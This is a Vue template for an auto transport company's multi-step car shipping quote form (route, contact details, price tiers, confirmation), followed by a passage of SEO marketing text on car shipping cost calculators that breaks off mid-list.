<template>
  <main class="page lg:mt-[150px] mt-[100px]">
    <div>
      <div class="container min-h-[100vh]">
        <div
          class="hidden lg:flex steps items-center justify-between gap-[32px]"
        >
          <div
            class="flex gap-[8px] items-center w-[85%]"
            :class="[step == 1 ? 'active' : '', step > 1 ? 'finished' : '']"
          >
            <div class="step-icon">
              <icons name="pick_up" />
            </div>
            <p>Shipment Details</p>
          </div>
          <div
            class="steps-line"
            :class="step > 1 ? 'bg-[#90D26D]' : 'bg-[#5c6670]'"
          ></div>
          <div
            class="flex gap-[8px] items-center justify-center w-full"
            :class="[step == 2 ? 'active' : '', step > 2 ? 'finished' : '']"
          >
            <div class="step-icon">
              <icons name="user" />
            </div>
            <p>Shipper Information</p>
          </div>
          <div
            class="steps-line"
            :class="step > 2 ? 'bg-[#90D26D]' : 'bg-[#5c6670]'"
          ></div>

          <div
            class="flex gap-[8px] items-center justify-center"
            :class="[step == 3 ? 'active' : '', step > 3 ? 'finished' : '']"
          >
            <div class="step-icon">
              <icons name="price" />
            </div>
            <p>Price</p>
          </div>
          <div
            class="steps-line"
            :class="step > 3 ? 'bg-[#90D26D]' : 'bg-[#5c6670]'"
          ></div>

          <div
            class="col-span-1 flex gap-[8px] items-center justify-end"
            :class="[step == 4 ? 'active' : '', step > 4 ? 'finished' : '']"
          >
            <div class="step-icon">
              <icons name="confirmation" />
            </div>
            <p>Confirmation</p>
          </div>
        </div>
        <div class="grid grid-cols-12 grid-flow-row mt-[40rem] gap-[32rem]">
          <div
            v-if="step == 1"
            class="lg:col-span-6 col-span-12 information-form rounded-[16px] lg:pt-[32rem] px-[22px] py-[15px] lg:pb-[36rem] lg:px-[48rem] overflow-hidden border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
          >
            <div>
              <h1 class="lg:text-[30px] text-[25px] font-bold mb-[px]">
                Car Shipping Cost Calculator
              </h1>
              <p
                class="font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
                style="color: rgb(92, 102, 112)"
              >
                Our Professional Team is Ready to Assist You. If you any help do
                not hesitate to call us at
                <a href="tel:'(929) 244-8696'" class="text-[#FF4E00]"
                  >(929) 244-8696</a
                >
              </p>
              <div class="shipper-info flex flex-col gap-[20px]">
                <div class="relative">
                  <icons name="pick_up" />
                  <el-autocomplete
                    id="ship-from"
                    v-model="shipmentInfo.from"
                    :class="$v.shipmentInfo.from.$anyError ? 'hasError' : ''"
                    :fetch-suggestions="searchZipCodes"
                    clearable
                    placeholder="From (Zip or City, State)"
                    @select="handleSelectFrom"
                  >
                    <template slot-scope="{ item }">
                      <div>
                        {{ item.name }}, {{ item.city }}, {{ item.state }}
                      </div>
                    </template>
                  </el-autocomplete>
                </div>
                <div class="relative">
                  <icons name="drop_off" />
                  <el-autocomplete
                    id="ship-to"
                    v-model="shipmentInfo.to"
                    :class="$v.shipmentInfo.to.$anyError ? 'hasError' : ''"
                    :fetch-suggestions="searchZipCodes"
                    clearable
                    placeholder="To (Zip or City, State)"
                    @select="handleSelectTo"
                  >
                    <template slot-scope="{ item }">
                      <div>
                        {{ item.city }}, {{ item.state }}, {{ item.name }}
                      </div>
                    </template>
                  </el-autocomplete>
                </div>
                <div class="relative">
                  <icons color="#ff0000" name="date" />
                  <el-select
                    v-show="shipmentInfo.date !== 'specificDate'"
                    id="ship-date"
                    v-model="shipmentInfo.date"
                    :class="$v.shipmentInfo.date.$anyError ? 'hasError' : ''"
                    :automatic-dropdown="false"
                    placeholder="Pick up Date"
                    @change="handleDate(shipmentInfo.date)"
                  >
                    <el-option
                      v-for="item in dateOptions"
                      :key="item.value"
                      :label="item.label"
                      :value="item.value"
                    />
                  </el-select>
                  <el-date-picker
                    v-show="shipmentInfo.date === 'specificDate'"
                    id="ship-specificDate"
                    v-model="shipmentInfo.specificDate"
                    automatic-dropdown="true"
                    value-format="dd/MM/yyyy"
                    class="w-full"
                    type="date"
                    placeholder="Pick a day"
                    @change="handleSpecificDate"
                  >
                  </el-date-picker>
                </div>
                <div class="relative">
                  <icons name="car" />

                  <el-select
                    id="ship-type"
                    v-model="shipmentInfo.type"
                    :class="$v.shipmentInfo.type.$anyError ? 'hasError' : ''"
                    placeholder="Size of Car"
                  >
                    <el-option
                      class="size-of-car-select"
                      label="Car"
                      value="Car"
                    >
                      <icons name="carType" />
                      <p>Car</p>
                    </el-option>
                    <el-option
                      class="size-of-car-select"
                      label="SUV"
                      value="SUV"
                      ><icons name="suv" />
                      <p>SUV</p>
                    </el-option>
                    <el-option
                      class="size-of-car-select"
                      label="Pickup"
                      value="Pickup"
                    >
                      <icons name="pickup" />
                      <p>Pickup</p>
                    </el-option>
                    <el-option
                      class="size-of-car-select"
                      label="Motorcycle"
                      value="Motorcycle"
                    >
                      <icons name="motorcycle" />
                      <p>Motorcycle</p>
                    </el-option>
                  </el-select>
                </div>
              </div>
            </div>
            <div class="mt-[20px]">
              <p class="terms-quoteform lg:text-[16px] text-[12px]">
                By proceeding with the above form, you accept our
                <a
                  href="https://www.xpresstransportation.org/terms-and-conditions"
                  class="text-[#FF4E00]"
                  >Terms</a
                >
                and
                <a
                  href="https://www.xpresstransportation.org/privacy-policy"
                  class="text-[#FF4E00]"
                  >Privacy Policy</a
                >
                you are agreed to receive SMS messages from our company. We are
                committed to safeguarding your privacy and personal information.
              </p>
            </div>
            <button class="mt-[20px] w-full" @click="stepOneValidate()">
              Continue
            </button>
          </div>
          <div
            v-if="step == 2"
            class="lg:col-span-6 col-span-12 information-form rounded-[16px] lg:pt-[32rem] px-[22px] py-[15px] lg:pb-[36rem] lg:px-[48rem] overflow-hidden border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
          >
            <div>
              <h1 class="lg:text-[30px] text-[25px] font-bold mb-[px]">
                Let's Get a Quote For You
              </h1>
              <p
                class="font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
                style="color: rgb(92, 102, 112)"
              >
                Our Professional Team is Ready to Assist You. If you any help do
                not hesitate to call us at
                <a href="tel:'(929) 244-8696'" class="text-[#FF4E00]"
                  >(929) 244-8696</a
                >
              </p>
              <div class="shipper-info flex flex-col gap-[20px]">
                <div class="relative">
                  <Icons name="user" />
                  <el-input
                    v-model="personalInfo.name"
                    :class="$v.personalInfo.name.$anyError ? 'hasError' : ''"
                    placeholder="Your name"
                  />
                </div>
                <div class="relative">
                  <Icons name="phone" />
                  <el-input
                    v-model="personalInfo.phone"
                    v-mask="'(###) ### ## ##'"
                    :class="$v.personalInfo.phone.$anyError ? 'hasError' : ''"
                    placeholder="Your Phone Number"
                  />
                </div>
                <div class="relative">
                  <Icons color="#ff0000" name="mail" />
                  <el-input
                    v-model="personalInfo.email"
                    :class="$v.personalInfo.email.$anyError ? 'hasError' : ''"
                    placeholder="Your Email"
                  />
                </div>
              </div>
            </div>

            <div class="mt-[20px]">
              <p class="terms-quoteform lg:text-[16px] text-[12px]">
                By proceeding with the above form, you accept our
                <a
                  href="https://www.xpresstransportation.org/terms-and-conditions"
                  class="text-[#FF4E00]"
                  >Terms</a
                >
                and
                <a
                  href="https://www.xpresstransportation.org/privacy-policy"
                  class="text-[#FF4E00]"
                  >Privacy Policy</a
                >
                you are agreed to receive SMS messages from our company. We are
                committed to safeguarding your privacy and personal information.
              </p>
            </div>
            <button class="mt-[20px] w-full" @click="checkPrice()">
              Get My Quote
            </button>
          </div>
          <div
            v-if="step === 3"
            class="lg:col-span-9 text-center md:text-left col-span-12 grid grid-cols-3 gap-[32px] pricing-cards"
          >
            <div class="price-cards">
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Expedited
              </h1>
              <p class="mb-[32px] text-[18px] text-[#212525]">
                Open or Enclosed
              </p>
              <ul class="text-[16px]">
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Faster Pickup-Delivery
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Use your preferred dates
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Safe & Secured
                </li>
              </ul>
              <h2
                v-if="expeditedPrice"
                class="text-[42px] text-[#244567] mt-[32px] font-bold"
              >
                ${{ expeditedPrice }}
              </h2>
              <h2 v-else class="text-[42px] text-[#244567] mt-[32px] font-bold">
                <div class="loader"></div>
              </h2>
              <button class="btn_blue" @click="expetidedChoosen()">
                Choose
              </button>
            </div>
            <div class="price-cards relative top-choice">
              <div
                class="badge flex items-center items-center gap-[4px] absolute top-[-16px] right-0 bg-[#FF4E00] rounded-[16px] px-[8px] py-[4px]"
              >
                <icons name="discount" />
                <p>Top Choice</p>
              </div>
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Best Value
              </h1>
              <p class="mb-[32px] text-[18px] text-[#212525]">Open Carrier</p>
              <ul class="text-[16px]">
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Best Priced Availability
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Door to Door Service
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Insurance Included
                </li>
              </ul>
              <h2
                v-if="bestValue"
                class="text-[42px] text-[#244567] mt-[32px] font-bold"
              >
                ${{ bestValue }}
              </h2>
              <h2 v-else class="text-[42px] text-[#244567] mt-[32px] font-bold">
                <div class="loader"></div>
              </h2>
              <button class="btn_blue" @click="bestValueChoosen()">
                Choose
              </button>
            </div>
            <div class="price-cards">
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Premium
              </h1>
              <p class="mb-[32px] text-[18px] text-[#212525]">
                Enclosed Carrier
              </p>
              <ul class="text-[16px]">
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  White Glove Sevice
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Hard Side Lift Gate Trailer
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Premium Auto Insurance
                </li>
              </ul>
              <h2
                v-if="premium"
                class="text-[42px] text-[#244567] mt-[32px] font-bold"
              >
                ${{ premium }}
              </h2>
              <h2 v-else class="text-[42px] text-[#244567] mt-[32px] font-bold">
                <div class="loader"></div>
              </h2>

              <button class="btn_blue" @click="premiumChoosen()">Choose</button>
            </div>
          </div>
          <!--          <div-->
          <!--            v-if="step === 4"-->
          <!--            class="lg:col-span-4 col-span-12 information-form confirmation rounded-[16px] pt-[20px] px-[20px] pb-[32px] h-auto border-solid border-[1px] border-[#e6ecf0] relative z-[2]"-->
          <!--            style="height: fit-content"-->
          <!--          >-->
          <!--            <h1 class="text-[30px] font-bold mb-[12px]">Confirmation</h1>-->
          <!--            <div class="w-full relative mb-[12px]">-->
          <!--              <span> Card Number </span>-->
          <!--              <icons name="card" />-->
          <!--              <el-input-->
          <!--                v-model="cardInfo.number"-->
          <!--                v-mask="'#### #### #### ####'"-->
          <!--                :class="$v.cardInfo.number.$anyError ? 'hasError' : ''"-->
          <!--                class="mt-[4px]"-->
          <!--                placeholder="0000 0000 0000 0000"-->
          <!--              ></el-input>-->
          <!--            </div>-->
          <!--            <div class="w-full mb-[12px] relative">-->
          <!--              <span> Cardholder Name </span>-->
          <!--              <icons name="user" />-->

          <!--              <el-input-->
          <!--                v-model="cardInfo.name"-->
          <!--                :class="$v.cardInfo.name.$anyError ? 'hasError' : ''"-->
          <!--                class="mt-[4px]"-->
          <!--                placeholder="Name Surname"-->
          <!--              ></el-input>-->
          <!--            </div>-->
          <!--            <div class="w-full mb-[12px] relative">-->
          <!--              <span>Expiry date</span>-->
          <!--              <icons name="date" />-->
          <!--              <el-input-->
          <!--                v-model="cardInfo.date"-->
          <!--                v-mask="'##/##'"-->
          <!--                :class="$v.cardInfo.date.$anyError ? 'hasError' : ''"-->
          <!--                class="mt-[4px]"-->
          <!--                placeholder="MM/YY"-->
          <!--              ></el-input>-->
          <!--            </div>-->
          <!--            <div class="w-full mb-[12px] relative">-->
          <!--              <span>CVV</span>-->
          <!--              <icons name="cvv" />-->
          <!--              <el-input-->
          <!--                v-model="cardInfo.cvv"-->
          <!--                v-mask="'####'"-->
          <!--                :class="$v.cardInfo.cvv.$anyError ? 'hasError' : ''"-->
          <!--                class="mt-[4px]"-->
          <!--                placeholder="0000"-->
          <!--              ></el-input>-->
          <!--            </div>-->
          <!--            <div class="w-full relative">-->
          <!--              <span>ZIP/Postal code</span>-->
          <!--              <icons name="mail" />-->

          <!--              <el-input-->
          <!--                v-model="cardInfo.zip"-->
          <!--                v-mask="'#####'"-->
          <!--                :class="$v.cardInfo.zip.$anyError ? 'hasError' : ''"-->
          <!--                class="mt-[4px]"-->
          <!--                placeholder="00000"-->
          <!--              ></el-input>-->
          <!--            </div>-->
          <!--            <button class="w-full mt-[32rem]" @click="ccInfoValidate()">-->
          <!--              Submit-->
          <!--            </button>-->
          <!--          </div>-->
          <div
            v-if="step === 4"
            class="lg:col-span-4 col-span-12 information-form confirmation rounded-[16px] pt-[20px] px-[20px] pb-[32px] h-auto border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
            style="height: fit-content"
          >
            <h1 class="text-[30px] font-bold mb-[12px]">Thank You!!!</h1>
            <iframe
              src="https://lottie.host/embed/71e0bd1f-14f0-4614-8a3f-1f418bd671d2/5aFxWuFE1i.json"
            ></iframe>
            <p
              class="text-center font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
            >
              Your request has been received. Your will be contacted shortly!
            </p>
            <p>
              We recommend checking out our blog,
              <a
                class="text-[#FF4E00]"
                href="https://www.xpresstransportation.org/blog/preparing-vehicle"
                >The Ultimate Guide to Preparing Your Car for Shipping</a
              >
              on our website. It's packed with useful tips to make your car
              shipping experience smooth and hassle-free.
            </p>
          </div>

          <div
            v-if="step > 3"
            class="col-span-12 lg:col-span-5 hidden lg:block"
            style="height: fit-content"
          >
            <icons name="us_map" />
          </div>

          <div v-if="step > 2" class="col-span-12 lg:col-span-3 quote-details">
            <div
              v-if="step > 3"
              class="rounded-[16px] mb-[32px] p-[20px] overflow-hidden border-solid border-[2px] border-[#e6ecf0] relative z-[2]"
            >
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Price:
              </h1>
              <p>Total Price:</p>
              <h2 class="text-[42px] text-[#244567] font-bold">
                ${{ choosenPrice }}
              </h2>
              <p>Due Now:</p>
              <h2 class="text-[42px] text-[#244567] font-bold">$0</h2>
            </div>
            <div
              class="rounded-[16px] p-[20px] overflow-hidden border-solid border-[2px] border-[#e6ecf0] relative z-[2]"
            >
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Quote Details
              </h1>
              <el-collapse v-model="activeNamesCollapse" accordion>
                <el-collapse-item
                  title="Shipment Details"
                  class="relative"
                  name="1"
                >
                  <div class="relative">
                    <div
                      class="absolute z-10 cursor-pointer right-[5px] top-[10px]"
                      @click="step = 1"
                    >
                      <icons name="edit" />
                    </div>

                    <h6>Ship From:</h6>
                    <p>{{ shipmentInfo.from }}</p>
                  </div>
                  <div>
                    <h6>Deliver To:</h6>
                    <p>{{ shipmentInfo.to }}</p>
                  </div>
                  <div>
                    <h6>Vehicle Type:</h6>
                    <p>{{ shipmentInfo.type }}</p>
                  </div>
                  <div>
                    <h6>Shipment Date:</h6>
                    <p>{{ shipmentInfo.date }}</p>
                  </div>
                </el-collapse-item>
                <el-collapse-item title="Personal Info" name="2">
                  <div class="relative">
                    <div
                      class="absolute z-10 cursor-pointer right-[5px] top-[10px]"
                      @click="step = 2"
                    >
                      <icons name="edit" />
                    </div>
                    <h6>Your Name:</h6>
                    <p>{{ personalInfo.name }}</p>
                  </div>
                  <div>
                    <h6>Your Phone Number:</h6>
                    <p>{{ personalInfo.phone }}</p>
                  </div>
                  <div>
                    <h6>Your Email:</h6>
                    <p>{{ personalInfo.email }}</p>
                  </div>
                </el-collapse-item>
              </el-collapse>
            </div>
          </div>
          <div
            class="lg:col-span-6 col-span-12"
            style="height: fit-content"
            :class="step > 2 ? 'hidden' : 'block'"
          >
            <icons name="us_map" class="hidden lg:block" />
            <Fancybox
              :options="{
                Carousel: {
                  infinite: false,
                },
              }"
            >
              <a
                class="w-full"
                data-fancybox="gallery"
                href="https://www.youtube.com/shorts/2P--abryrJM"
              >
                <div
                  class="flex items-center justify-center cursor-pointer mt-[0rem] lg:mt-[100rem]"
                >
                  <div
                    class="bg-[#244567] flex items-center gap-[16px] py-[8px] px-[10px] rounded-[8px] hover:bg-[#FF4E00] transition"
                  >
                    <icons name="video_play" />
                    <div>
                      <h2 class="text-[20rem] text-[#fff]">
                        What are our customer's saying?
                      </h2>
                      <p class="text-[12px] text-[#fff]">Run time 22 seconds</p>
                    </div>
                  </div>
                </div>
              </a>
            </Fancybox>
          </div>
        </div>
        <div class="grid grid-cols-12 grid-flow-row mt-[40rem] gap-[32rem]">
          <div
            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
          >
            <icons name="doorToDoor" />
            <div>
              <h6 class="text-[20rem] font-bold text-[#ff4e00]">
                DOOR TO DOOR DELIVERY
              </h6>
              <p class="text-[16rem]">From Your Location to Your Destination</p>
            </div>
          </div>
          <div
            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
          >
            <icons name="secure" />
            <div>
              <h6 class="text-[20rem] font-bold text-[#ff4e00]">
                SAFE SHIPPING
              </h6>
              <p class="text-[16rem]">High value insurance</p>
            </div>
          </div>

          <div
            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
          >
            <icons name="pricetag" />
            <div>
              <h6 class="text-[20rem] font-bold text-[#ff4e00]">
                AFFORDABLE PRICING
              </h6>
              <p class="text-[16rem]">Cost-Effective Rates</p>
            </div>
          </div>
        </div>
        <div>
          <!--        <img src="/src/assets/images/main bg.png"-->
          <!--             class=" absolute right-[-10%] top-[50%] transform translate-y-[-50%] z-[1] hidden lg:block " alt=""/>-->
          <img
            src="/images/left-grad-eff.png"
            class="absolute left-0 top-[50%] transform w-[25%] translate-y-[-50%] h-auto z-[0] pointer-events-none"
            alt=""
          />
          <img
            src="/images/right-grad-eff.png"
            class="absolute right-0 top-[50%] transform translate-y-[-50%] z-[0] pointer-events-none"
            alt=""
          />
          <icons
            class="lg:block absolute right-0 top-[50%] transform translate-y-[-50%] z-[0] h-auto w-full lg:w-auto pointer-events-none hidden"
            name="right_side_anim"
          />
          <icons
            class="absolute left-0 top-[50%] transform rotate-[180deg] translate-y-[-50%] z-[0] h-full w-full lg:w-auto pointer-events-none !hidden lg:inline-flex"
            name="right_side_anim"
          />
        </div>
      </div>
      <div class="container text-information">
        <h1>
          When it comes to transporting your vehicle, understanding the cost
          involved is crucial.
        </h1>
        <p>
          Whether you're relocating, buying a car online, or shipping a prized
          classic to a car show, knowing how much you'll need to budget can help
          you make informed decisions and avoid unexpected expenses. This is
          where a car shipping cost calculator becomes an invaluable tool.
        </p>

        <p>
          Auto transport services have grown increasingly popular due to the
          convenience and peace of mind they offer. However, the cost of
          shipping a vehicle can vary significantly based on a multitude of
          factors. Utilizing a car shipping cost calculator can provide you with
          a quick, accurate estimate tailored to your specific needs and
          circumstances.
        </p>

        <p>
          In this comprehensive guide, we'll explore how car shipping cost
          calculators work, the benefits of using them, and the various factors
          that influence the cost of vehicle transport services. We'll also
          provide practical tips for reducing shipping costs and answer some
          frequently asked questions to help you navigate the car shipping
          process with confidence.
        </p>

        <h2>Why Use a Car Shipping Cost Calculator?</h2>
        <p>A car shipping cost calculator offers several advantages:</p>
        <ul>
          <li>
            <strong>Transparency and Accuracy:</strong> It provides a clear and
            accurate estimate based on your inputs, helping you understand what
            to expect.
          </li>
          <li>
            <strong>Convenience:</strong> Quickly obtain a cost estimate without
            the need for extensive research or multiple phone calls.
          </li>
          <li>
            <strong>Budget Planning:</strong> Helps you budget appropriately for
            your vehicle transport, avoiding surprises and financial strain.
          </li>
          <li>
            <strong>Comparison Shopping:</strong> Allows you to compare costs
            from different auto transport companies, ensuring you get the best
            deal.
          </li>
        </ul>

        <h2>The Growing Importance of Auto Transport Services</h2>
        <p>
          The need for reliable vehicle transport services has surged in recent
          years, driven by factors such as:
        </p>
        <ul>
          <li>
            <strong>Increased Online Car Sales:</strong> More people are buying
            vehicles online from other states or countries, necessitating
            dependable shipping options.
          </li>
          <li>
            <strong>Corporate Relocations:</strong> Professionals moving for
            work often need to ship their vehicles to their new location.
          </li>
          <li>
            <strong>Seasonal Moves:</strong> Snowbirds and seasonal movers
            frequently require vehicle transport services to avoid long drives.
          </li>
          <li>
            <strong>Classic and Exotic Car Shipping:</strong> Owners of valuable
            cars often choose shipping to protect their investments from road
            hazards and wear.
          </li>
        </ul>

        <p>
          With so many variables influencing the cost of auto transport, it's
          essential to have a reliable tool to help you navigate the pricing
          landscape. The car shipping cost calculator is designed to simplify
          this process, providing you with the information needed to make
          informed decisions about your vehicle transport.
        </p>

        <p>
          In the sections that follow, we will delve into how these calculators
          work, the benefits they offer, and the various factors that impact car
          shipping costs. By the end of this guide, you'll have a comprehensive
          understanding of car shipping costs and how to use a cost calculator
          to your advantage.
        </p>

        <h2>How Car Shipping Cost Calculators Work</h2>
        <p>
          Understanding how a car shipping cost calculator works is essential
          for getting accurate and reliable estimates for your vehicle transport
          needs. These calculators take into account various factors to provide
          a tailored quote based on your specific requirements. Here's a
          detailed look at the process and the key elements involved in
          generating an estimate.
        </p>

        <h3>Input Requirements</h3>
        <p>
          To generate an accurate cost estimate, a car shipping cost calculator
          requires several pieces of information:
        </p>
        <h4>Vehicle Details:</h4>
        <ul>
          <li>
            <strong>Make and Model:</strong> The size and type of your vehicle
            can influence the cost. Larger or luxury vehicles might require
            special handling or more space, impacting the price.
          </li>
          <li>
            <strong>Condition:</strong> Whether the vehicle is operable or
            inoperable. Inoperable vehicles often cost more to transport due to
            the additional equipment and effort required for loading and
            unloading.
          </li>
        </ul>
        <h4>Pickup and Delivery Locations:</h4>
        <ul>
          <li>
            <strong>ZIP Codes or Addresses:</strong> Specific pickup and
            delivery points are crucial as distances and route accessibility
            directly affect costs.
          </li>
          <li>
            <strong>Urban vs. Rural Areas:</strong> Shipping to or from rural
            areas may be more expensive due to limited accessibility and less
            frequent carrier routes.
          </li>
        </ul>
        <h4>Transport Type:</h4>
        <ul>
          <li>
            <strong>Open Transport:</strong> The most common and cost-effective
            method, where vehicles are transported on open carriers.
          </li>
          <li>
            <strong>Enclosed Transport:</strong> Provides extra protection for
            the vehicle but at a higher cost, ideal for luxury, classic, or
            exotic cars.
          </li>
        </ul>
        <h4>Distance:</h4>
        <ul>
          <li>
            The total distance between the pickup and delivery locations. Longer
            distances generally result in higher shipping costs.
          </li>
        </ul>
        <h4>Desired Shipping Dates:</h4>
        <ul>
          <li>
            <strong>Flexible Dates:</strong> If you have flexibility with your
            shipping dates, you may be able to secure lower rates.
          </li>
          <li>
            <strong>Expedited Shipping:</strong> If you need your vehicle
            transported within a specific timeframe, this may increase the cost.
          </li>
        </ul>
        <h4>Additional Services:</h4>
        <ul>
          <li>
            <strong>Door-to-Door Service:</strong> Direct pickup and delivery at
            specified locations, offering convenience but potentially higher
            costs.
          </li>
          <li>
            <strong>Insurance Coverage:</strong> Additional insurance for
            higher-value vehicles can impact the overall price.
          </li>
        </ul>

        <h3>Factors Influencing the Cost</h3>
        <p>
          A car shipping cost calculator considers several key factors to
          determine the final shipping cost. Understanding these factors can
          help you better estimate and manage your budget.
        </p>
        <h4>Distance:</h4>
        <ul>
          <li>
            The primary factor affecting cost. Longer distances incur higher
            costs due to fuel, driver time, and wear and tear on the carrier.
          </li>
        </ul>
        <h4>Vehicle Size and Weight:</h4>
        <ul>
          <li>
            Larger and heavier vehicles take up more space on the carrier and
            may require additional resources for transport, leading to higher
            costs.
          </li>
        </ul>
        <h4>Transport Type:</h4>
        <ul>
          <li>
            <strong>Open Transport:</strong> More economical and widely used.
          </li>
          <li>
            <strong>Enclosed Transport:</strong> Higher cost due to enhanced
            protection and limited availability.
          </li>
        </ul>
        <h4>Pickup and Delivery Locations:</h4>
        <ul>
          <li>
            <strong>Urban Areas:</strong> Generally less expensive due to higher
            demand and easier accessibility.
          </li>
          <li>
            <strong>Rural Areas:</strong> May incur additional costs due to
            longer distances from main routes and less frequent carrier
            availability.
          </li>
        </ul>
        <h4>Seasonality:</h4>
        <ul>
          <li>
            <strong>Peak Seasons:</strong> Higher demand during summer months
            and holidays can drive up prices.
          </li>
          <li>
            <strong>Off-Peak Seasons:</strong> Lower demand can result in cost
            savings.
          </li>
        </ul>
        <h4>Fuel Prices:</h4>
        <ul>
          <li>
            Fluctuations in fuel prices can impact the overall cost of
            transport. Higher fuel costs can lead to increased shipping rates.
          </li>
        </ul>
        <h4>Carrier Availability:</h4>
        <ul>
          <li>
            <strong>Supply and Demand:</strong> High demand for carriers can
            increase prices, while greater availability can lead to competitive
            pricing.
          </li>
        </ul>

        <h3>Calculation Methodology</h3>
        <p>
          The calculation process involves aggregating the input data and
          applying industry-standard pricing models to generate an estimate.
          Here’s a simplified overview of how it works:
        </p>
        <ul>
          <li>
            <strong>Data Collection:</strong> The calculator collects all
            relevant data points provided by the user.
          </li>
          <li>
            <strong>Base Rate Calculation:</strong> A base rate is determined
            based on the distance and transport type.
          </li>
          <li>
            <strong>Adjustments for Additional Factors:</strong> Adjustments are
            made for factors such as vehicle size, operability, location
            specifics, and additional services.
          </li>
          <li>
            <strong>Final Estimate:</strong> The final estimate is generated by
            summing the base rate and all applicable adjustments.
          </li>
        </ul>

        <h3>Example of Using a Car Shipping Cost Calculator</h3>
        <p>
          Let's walk through an example to illustrate how a car shipping cost
          calculator works:
        </p>
        <ul>
          <li><strong>Vehicle Details:</strong> 2019 Toyota Camry, operable</li>
          <li>
            <strong>Pickup Location:</strong> Los Angeles, CA (urban area)
          </li>
          <li><strong>Delivery Location:</strong> Dallas, TX (urban area)</li>
          <li><strong>Transport Type:</strong> Open transport</li>
          <li>
            <strong>Shipping Dates:</strong> Flexible within a two-week window
          </li>
          <li><strong>Additional Services:</strong> Door-to-door service</li>
        </ul>
        <p>
          After entering these details into the calculator, it processes the
          inputs and applies relevant pricing models. The output is an estimated
          cost, such as $900 for the shipment.
        </p>

        <p>
          By understanding the input requirements, factors influencing cost, and
          the calculation methodology, you can better utilize a car shipping
          cost calculator to get accurate estimates for your vehicle transport
          needs. In the next section, we will discuss the numerous benefits of
          using a car shipping cost calculator and how it can help streamline
          your auto transport planning.
        </p>

        <h2>Benefits of Using a Car Shipping Cost Calculator</h2>
        <p>
          A car shipping cost calculator offers numerous advantages that make it
          an indispensable tool for anyone looking to transport a vehicle.
          Whether you are an individual planning a move or a car dealership
          arranging bulk shipments, the benefits of using a cost calculator are
          significant. Here’s a detailed look at how these calculators can
          enhance your auto transport experience.
        </p>

        <h3>1. Transparency and Accuracy</h3>
        <p>
          One of the primary benefits of using a car shipping cost calculator is
          the transparency it provides. By inputting specific details about your
          transport needs, you receive a clear and accurate estimate of the
          costs involved. This transparency helps in understanding what you are
          paying for and ensures there are no hidden fees or unexpected charges.
        </p>
        <ul>
          <li>
            <strong>Breakdown of Costs:</strong> The calculator often provides a
            detailed breakdown of the cost components, such as base rate,
            distance charge, and any additional fees for special services.
          </li>
          <li>
            <strong>Real-time Updates:</strong> Many calculators offer real-time
            updates based on current market rates, fuel prices, and carrier
            availability, ensuring your estimate is up-to-date.
          </li>
        </ul>

        <h3>2. Convenience and Ease of Use</h3>
        <p>
          Car shipping cost calculators are designed to be user-friendly and
          accessible, making them convenient tools for anyone to use. You can
          quickly get an estimate without the need for lengthy phone calls or
          emails.
        </p>
        <ul>
          <li>
            <strong>Quick Estimates:</strong> Obtain a quote in minutes by
            simply entering the necessary details.
          </li>
          <li>
            <strong>24/7 Availability:</strong> Access the calculator anytime,
            anywhere, without waiting for business hours or response times.
          </li>
          <li>
            <strong>No Obligation:</strong> Get an estimate without any
            commitment, allowing you to explore options freely.
          </li>
        </ul>

        <h3>3. Budget Planning and Financial Management</h3>
        <p>
          Knowing the cost of shipping your vehicle upfront helps in effective
          budget planning. This is particularly important for those with tight
          budgets or those needing to allocate funds for other moving-related
          expenses.
        </p>
        <ul>
          <li>
            <strong>Financial Clarity:</strong> Clear understanding of the
            shipping cost allows for better financial planning and allocation.
          </li>
          <li>
            <strong>Avoid Overruns:</strong> Prevents unexpected expenses that
            could strain your budget.
          </li>
          <li>
            <strong>Comparative Analysis:</strong> Compare costs from multiple
            providers to choose the most cost-effective option.
          </li>
        </ul>

        <h3>4. Informed Decision-Making</h3>
        <p>
          A car shipping cost calculator provides valuable information that aids
          in making informed decisions about your vehicle transport. By
          understanding the cost implications of various factors, you can choose
          the best options for your needs.
        </p>
        <ul>
          <li>
            <strong>Transport Type:</strong> Decide between open and enclosed
            transport based on cost and protection needs.
          </li>
          <li>
            <strong>Timing:</strong> Select shipping dates that offer the best
            rates, avoiding peak season surcharges.
          </li>
          <li>
            <strong>Service Level:</strong> Determine if additional services,
            such as door-to-door delivery, are worth the extra cost.
          </li>
        </ul>

        <h3>5. Competitive Pricing and Cost Savings</h3>
        <p>
          Using a cost calculator allows you to compare prices from different
          auto transport companies, ensuring you get competitive rates. This
          competitive analysis can lead to significant cost savings.
        </p>
        <ul>
          <li>
            <strong>Multiple Quotes:</strong> Easily obtain and compare quotes
            from various providers.
          </li>
          <li>
            <strong>Discounts and Promotions:</strong> Identify companies
            offering discounts, promotions, or special rates.
          </li>
